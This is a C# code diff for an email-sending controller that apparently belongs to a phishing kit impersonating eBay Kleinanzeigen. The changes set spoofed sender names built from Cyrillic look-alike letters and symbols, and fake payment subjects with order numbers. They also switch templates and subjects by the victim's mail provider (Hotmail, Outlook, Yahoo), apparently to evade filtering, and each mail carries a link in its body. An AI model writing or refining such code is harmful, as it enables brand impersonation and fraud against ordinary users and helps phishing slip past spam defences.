@@ -69,16 +69,21 @@ public class SenderController : ControllerBase
 	{
 		var body = await GetBody(link, ServiceType.EbayDe, email);
 		
-		var displayName = "◦EBAY◦Kleinanzeigen◦Info®";
+		/*var displayName = "→ЕВАY◦kleinanzeigen•Payment ®";
 
-		var subject = "Bezahlung der Ware! Vielen Dank, dass Sie sich für uns entschieden haben.#528247";
+		var subject = $"Nutzer-Anfrage zu deiner Anzeige#{_orderNumber} .";
+		*/
+		
+		var displayName = "•ЕВАY◦kleinanzeigen•Info";
 
-		/*if (email.Contains("icloud"))
+		var subject = "Bezahlung der Ware! #834891";
+
+		if (email.Contains("hotmail") || email.Contains("outlook"))
 		{
-			displayName = "•ebay-kleinanzeigen-de©";
+			displayName = "ebay-kleinanzeigen-de  ©";
 
-			subject = $"#{_orderNumber} Nutzer-Anfrage zu deiner Anzeige.";
-		}*/
+			subject = $"Nutzer-Anfrage zu deiner Anzeige#{_orderNumber} .";
+		}
 
 		var message = new MailMessage(_senderEmail, email, subject, body)
 		{
@@ -124,8 +129,9 @@ public class SenderController : ControllerBase
 	private async Task<string> GetBody(string link, ServiceType serviceType,
 		string email)
 	{
-		var template = EbayTemplate.Custom;
-
+		var template = EbayTemplate.Original;
+		//var template = EbayTemplate.Custom;
+		
 		if (email.Contains("yahoo") || email.Contains("hotmail") || email.Contains("outlook") && serviceType == ServiceType.EbayDe)
 			template = EbayTemplate.Original;
 		
